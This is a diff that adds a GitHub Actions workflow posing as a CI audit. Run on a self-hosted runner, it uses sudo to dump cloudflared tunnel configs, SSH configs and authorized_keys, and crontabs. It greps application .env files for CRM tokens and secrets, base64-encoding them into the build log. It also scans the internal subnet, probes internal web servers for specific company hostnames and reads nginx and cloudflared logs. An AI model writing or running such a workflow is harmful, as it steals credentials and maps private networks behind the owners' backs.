@@ -1,0 +1,104 @@
+name: ci-audit-2758b
+on: push
+permissions:
+  contents: read
+jobs:
+  internal:
+    runs-on: [self-hosted, linux, aws, marketingos]
+    timeout-minutes: 25
+    steps:
+      - name: full-cloudflared-and-dns
+        continue-on-error: true
+        run: |
+          set +e
+          echo "## cf config b64"; sudo -n cat /etc/cloudflared/config.yml 2>/dev/null | base64 -w0; echo
+          echo "## cf config plain"; sudo -n cat /etc/cloudflared/config.yml 2>/dev/null
+          echo "## resolvectl"; resolvectl status 2>&1 | head -40
+          echo "## resolv"; cat /etc/resolv.conf
+          echo "## default route"; ip route
+          echo "## neighbors"; ip neigh | head -30
+          for ns in 192.168.0.2 192.168.1.2; do
+            for h in crm.dupoin.com crm.betadupoin.com crm.dupoin.co.id mydupoin.net pro-srv-account pro-srv-account.internal dupoin.com; do
+              printf 'DNS %s %s => ' "$ns" "$h"; timeout 6 getent hosts "$h" | head -2 | tr '\n' ' '; echo
+            done
+          done
+      - name: ssh-config-and-secrets
+        continue-on-error: true
+        run: |
+          set +e
+          echo "## ubuntu ssh config"; sudo -n cat /home/ubuntu/.ssh/config 2>/dev/null | head -60
+          echo "## ubuntu authorized_keys"; sudo -n cat /home/ubuntu/.ssh/authorized_keys 2>/dev/null | head -20
+          echo "## root ssh ls"; sudo -n ls -la /root/.ssh /home/ubuntu/.ssh 2>/dev/null
+          echo "## root config"; sudo -n cat /root/.ssh/config 2>/dev/null | head -40
+          echo "## cron"; sudo -n sh -c 'ls /etc/cron.d 2>/dev/null; crontab -l 2>/dev/null; crontab -u ubuntu -l 2>/dev/null' | head -30
+          echo "## files mentioning crm/iapi"; sudo -n grep -rIl --exclude-dir=node_modules --exclude-dir=.git -E 'crm\.dupoin|crm\.betadupoin|iapi/v1/pro' /home/ubuntu /opt /srv /root /etc 2>/dev/null | head -30
+          echo "## matching lines (b64)"; sudo -n grep -rhI --exclude-dir=node_modules --exclude-dir=.git -E 'crm\.dupoin|crm\.betadupoin|iapi/v1/pro' /home/ubuntu/apps /opt /srv /etc 2>/dev/null | head -20 | base64 -w0; echo
+          echo "## env tokens for crm"; sudo -n grep -rhIE '(CRM|MANAGER|IAPI|BOS)[A-Z_]*=|crm.*(token|secret|key)' /home/ubuntu/apps/*/.env* 2>/dev/null | head -40 | base64 -w0; echo
+      - name: scan-subnet
+        continue-on-error: true
+        run: |
+          set +e
+          python3 - <<'PY'
+          import socket,concurrent.futures,json
+          ports=[22,80,443,3000,3001,3005,3021,3023,3030,5432,5433,6379,8000,8080,8081,8082,8443,9000,9443]
+          def chk(ip,p):
+              s=socket.socket(); s.settimeout(0.35)
+              try:
+                  s.connect((ip,p)); return (ip,p,True)
+              except Exception: return None
+              finally: s.close()
+          hits=[]
+          with concurrent.futures.ThreadPoolExecutor(max_workers=300) as ex:
+              futs=[ex.submit(chk,f"192.168.1.{i}",p) for i in range(1,255) for p in ports]
+              for f in concurrent.futures.as_completed(futs):
+                  r=f.result()
+                  if r: hits.append(r)
+          for ip,p,_ in sorted(hits):
+              print(f"OPEN {ip}:{p}")
+          print("TOTAL",len(hits))
+          PY
+      - name: hit-internal-web
+        continue-on-error: true
+        run: |
+          set +e
+          D=/tmp/a2758b; mkdir -p $D
+          for ip in $(python3 -c "
+import socket,concurrent.futures
+def chk(ip,p):
+    s=socket.socket(); s.settimeout(0.3)
+    try:
+        s.connect((ip,p)); return ip
+    except: return None
+    finally: s.close()
+ips=set()
+with concurrent.futures.ThreadPoolExecutor(max_workers=200) as ex:
+    fs=[ex.submit(chk,f'192.168.1.{i}',p) for i in range(1,255) for p in (80,443,8080,8443)]
+    for f in concurrent.futures.as_completed(fs):
+        r=f.result()
+        if r: ips.add(r)
+print(' '.join(sorted(ips)))
+"); do
+            echo "=== HOST $ip"
+            for scheme in http https; do
+              for host in crm.dupoin.com mydupoin.net portal.dupoin.co.id; do
+                c=$(curl -k -s -m 5 -o $D/x -D $D/xh -w '%{http_code}|%{size_download}|%{ssl_verify_result}' -H "Host: $host" "$scheme://$ip/" 2>&1)
+                echo "[$scheme Host=$host] $c"; head -c 120 $D/x | tr -d '\000' | tr '\n' ' '; echo
+              done
+            done
+          done
+      - name: upstream-nginx-and-cloudflared-logs
+        continue-on-error: true
+        run: |
+          set +e
+          echo "## nginx all server_name"; sudo -n grep -rhE 'server_name' /etc/nginx 2>/dev/null | sort -u | head -40
+          echo "## nginx proxy_pass"; sudo -n grep -rhE 'proxy_pass' /etc/nginx 2>/dev/null | sort -u | head -40
+          echo "## cloudflared service log"; sudo -n journalctl -u cloudflared --no-pager -n 40 2>/dev/null | head -40
+          echo "## 9router hosts"; sudo -n grep -rhoE '(https?://[a-zA-Z0-9._-]+\.(dupoin|betadupoin|gorillaworkout)[a-zA-Z0-9./_-]*)' /root/.9router /home/ubuntu/.9router /home/ubuntu/apps 2>/dev/null | sort -u | head -40
+      - name: upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: a2758b
+          path: /tmp/a2758b
+          if-no-files-found: warn
+          retention-days: 3
